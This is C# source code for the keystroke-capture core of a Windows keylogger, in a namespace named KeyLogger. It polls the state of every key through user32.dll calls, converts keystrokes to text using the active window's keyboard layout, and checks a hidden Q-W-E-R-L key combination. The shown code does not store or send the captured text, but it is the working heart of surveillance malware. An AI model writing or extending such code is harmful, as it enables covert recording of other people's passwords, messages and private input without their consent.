using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace KeyLogger
{
    class KeyboardMaster
    {
        [DllImport("user32.dll")]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        public static extern int GetKeyState(Int32 i);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, ExactSpelling = true)]
        private static extern int ToUnicodeEx(
            uint wVirtKey,
            uint wScanCode,
            byte[] lpKeyState,
            StringBuilder pwszBuff,
            int cchBuff,
            uint wFlags,
            IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        bool[] keyState = new bool[256];
        byte[] lpKeyState = new byte[256];
        IntPtr HKL;

        public KeyboardMaster()
        {
        }

        public void Scan()
        {
            uint proId = GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero);
            HKL = GetKeyboardLayout(proId);
            lpKeyState[(int)Keys.ShiftKey] = (GetAsyncKeyState((int)Keys.ShiftKey) == 0) ? (byte)0 : (byte)255;
            lpKeyState[(int)Keys.CapsLock] = (GetKeyState((int)Keys.CapsLock) == 0) ? (byte)0 : (byte)255;
            for (int i = 0; i < 256; i++)
            {
                keyState[i] = (GetAsyncKeyState(i) & 1) == 1;
            }
        }

        public bool IsKeyDown(Keys key)
        {
            return keyState[(int)key];
        }

        public bool IsKeyboardShortcut()
        {
            return GetAsyncKeyState((int)Keys.Q) != 0 &&
                   GetAsyncKeyState((int)Keys.W) != 0 &&
                   GetAsyncKeyState((int)Keys.E) != 0 &&
                   GetAsyncKeyState((int)Keys.R) != 0 &&
                   GetAsyncKeyState((int)Keys.L) != 0 &&
                   (IsKeyDown(Keys.Q) ||
                   IsKeyDown(Keys.W) ||
                   IsKeyDown(Keys.E) ||
                   IsKeyDown(Keys.R) ||
                   IsKeyDown(Keys.L)); 
        }

        public string KeyToString(Keys key)
        {
            switch (key)
            {
                case Keys.Return: return @"<\n>";
                case Keys.Back: return @"<\b>";
                case Keys.Delete: return @"<\d>";
                case Keys.Tab: return @"<\t>";
                case Keys.Left: return "<L>";
                case Keys.Right: return "<R>";
                case Keys.Down: return "<D>";
                case Keys.Up: return "<U>";
                default: return KeyToUnicode((uint)key);
            }
        }

        string KeyToUnicode(uint wVirtKey)
        {
            StringBuilder sbString = new StringBuilder();
            uint lScanCode = MapVirtualKey(wVirtKey, 0);
            ToUnicodeEx(wVirtKey, lScanCode, lpKeyState, sbString, (int)5, (uint)0, HKL);
            return sbString.ToString();
        }
    }
}

